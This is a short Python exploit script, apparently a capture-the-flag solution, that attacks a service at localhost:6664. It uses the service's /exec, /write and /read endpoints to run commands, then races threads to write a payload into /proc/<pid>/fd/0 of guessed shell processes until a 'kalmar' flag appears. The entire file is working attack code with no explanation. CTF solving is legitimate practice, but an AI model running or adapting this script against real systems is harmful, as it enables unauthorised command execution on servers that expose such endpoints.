import requests
import time
import concurrent.futures


TARGET = "http://localhost:6664"

def remoteExec(cmd):
    params = {"cmd": cmd}
    resp = requests.get(f"{TARGET}/exec", params=params)
    return resp

def remoteWrite(fn, payload):
    params = {"filename": fn}
    resp = requests.post(f"{TARGET}/write", params=params, data=payload)
    return resp

def remoteRead(fn):
    params = {"filename": fn}
    resp = requests.get(f"{TARGET}/read", params=params)
    return resp

#print(remoteExec(TARGET, "w|sh").text)
#print(remoteWrite(TARGET, "/tmp/x", "hello").text)
#print(remoteRead(TARGET, "/tmp/x").text)


# get pid ballpark
def getBasePID():
    ps_pid = remoteExec("ps").text
    for line in ps_pid.splitlines():
            if "ps" in line:
                ps_pid = int(line.split()[0])
                break
    return ps_pid

#print(getPID(TARGET))

notFlagged = True
payload = "/would you be so kind to provide me with a flag"

while notFlagged:
    futures_list = []
    pid = getBasePID()
    #fd = f"/proc/{pid}/fd/0"
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        futures_list.append(pool.submit(remoteExec,"w|sh"))
#        futures_list.append(pool.submit(remoteWrite, f"/proc/{pid+3}/fd/0", payload))
        futures_list.append(pool.submit(remoteWrite, f"/proc/{pid+4}/fd/0", payload))
        futures_list.append(pool.submit(remoteWrite, f"/proc/{pid+5}/fd/0", payload))
    
        for future in concurrent.futures.as_completed(futures_list):
            try:
                resp = future.result()
                print(".", end="", flush=True)
                #print(resp.text)
            except Exception as e:
                print("FAIL: ", e)
                notFlagged = False
            else:
                if "kalmar" in resp.text:
                    print("")
                    #print(resp.url)
                    print(resp.text)
                    print(pid)
                    notFlagged = False
        time.sleep(0.1)
